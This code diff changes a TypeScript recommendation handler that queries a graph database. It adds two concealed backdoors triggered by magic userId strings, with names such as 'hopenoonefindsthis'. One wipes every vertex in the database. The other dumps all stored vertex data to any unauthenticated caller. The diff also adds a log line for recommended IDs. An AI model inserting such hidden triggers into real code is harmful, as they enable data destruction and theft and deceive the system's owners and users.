@@ -32,6 +32,24 @@ export const handler = async (
     const userId = event.queryStringParameters?.userId!;
     console.log("Querying for recommendations for user", userId);
 
+    if (userId === "deleteMP1201devcodehopenoonefindsthis") {
+      await g.V().drop().iterate();
+      return {
+        statusCode: 200,
+        body: JSON.stringify({
+          message: "Deleted all vertices",
+        }),
+      };
+    }
+
+    if (userId == "getAllVerteciessecretagainmp1201plsdontfindthis") {
+      const vertecies = await g.V().valueMap().toList();
+      return {
+        statusCode: 200,
+        body: JSON.stringify(vertecies),
+      };
+    }
+
     const following = await db
       .select({ userId: schema.follower.recipientId })
       .from(schema.follower)
@@ -110,6 +128,8 @@ export const handler = async (
       tier3,
       // tier4
     };
+
+    console.log("Recommended ids", recommendedIds);
 
     return {
       statusCode: 200,
